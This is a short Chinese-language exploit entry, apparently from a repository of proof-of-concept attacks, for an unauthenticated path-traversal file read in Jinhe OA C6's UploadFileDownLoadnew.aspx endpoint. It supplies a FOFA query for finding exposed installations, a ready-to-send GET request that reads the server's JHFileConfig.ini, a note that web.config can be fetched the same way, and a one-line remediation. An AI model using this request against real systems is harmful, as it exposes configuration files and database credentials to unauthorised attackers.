---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA UploadFileDownLoadnew 任意文件读取漏洞

# 漏洞描述

金和OA C6 的 `JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx` 接口中 `FilePath` 参数未做有效校验，存在任意文件读取漏洞。未授权的远程攻击者可通过目录遍历读取服务器上的任意文件（如配置文件），进而获取数据库连接信息等敏感数据。

影响范围

金和OA C6

# 漏洞复现

FOFA：app="金和网络-金和OA"

POC：

```
GET /c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini HTTP/1.1
Host: target
```

`FilePath` 参数可替换为任意路径，如 `../../web.config`，直接返回文件内容。

# 修复方案

对 `FilePath` 参数做严格白名单校验，禁止目录遍历字符；联系厂商获取官方补丁并升级。
